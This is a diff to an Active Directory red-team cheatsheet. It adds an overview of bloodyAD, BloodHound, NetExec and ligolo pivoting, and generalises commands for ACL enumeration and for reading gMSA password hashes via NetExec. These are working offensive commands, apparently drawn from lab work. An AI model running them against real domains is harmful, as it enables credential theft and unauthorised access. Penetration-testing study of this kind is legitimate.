@@ -5,6 +5,13 @@ categories: [active directory, cheatsheet, red team]
 tags: [active directory, cheatsheet, red team]
 ---
 
+This cheatsheets covers everything AD-related:
+- Enumerating and exploiting DACLs, misconfigurations with bloodyAD
+- Mapping network domains with BloodHound
+- Authentication, enumeration, and credential dumping across various network services with NetExec
+- Pivoting with ligolo - double, triple and quad pivots, accessing internal ports
+
+
 ### bloodyAD
 
 bloodyAD is an Active Directory privilege escalation swiss army knife. bloodyAD can perform specific LDAP calls to a domain controller in order to perform AD privesc. It supports authentication using cleartext passwords, pass-the-hash, pass-the-ticket or certificates and binds to LDAP services of a domain controller to perform AD privesc.
@@ -30,7 +37,7 @@ Enumerate a user’s rights at the Domain Level
 bloodyAD --host dc01.ad.trilocor.local -d ad.trilocor.local -u username -p password get object 'DC=ad,DC=trilocor,DC=local' --attr ntsecuritydescriptor --resolve-sd
 ```
 
-Enumerate a user’s
+Enumerate a user’s rights, permissions, and ACLs
 
 ```bash
 #Enumerate a user's rights, permissions, ACLs
@@ -40,8 +47,8 @@ bloodyAD --host dc01.ad.trilocor.local -d ad.trilocor.local -u username -p passw
 **Read GMSA Password (ReadGMSAPassword)**
 
 ```bash
-##Use the Infrastructure 'ReadGMSAPassword' privilege to get the NTLM hash for ansible_dev$
-nxc ldap tombwatcher.htb -u Alfred -p basketball --gmsa
+##Use the 'ReadGMSAPassword' privilege to get the NTLM hash
+nxc ldap tombwatcher.htb -u user -p password --gmsa
 ```
 
 **Deleted Objects - AD Tombstones**
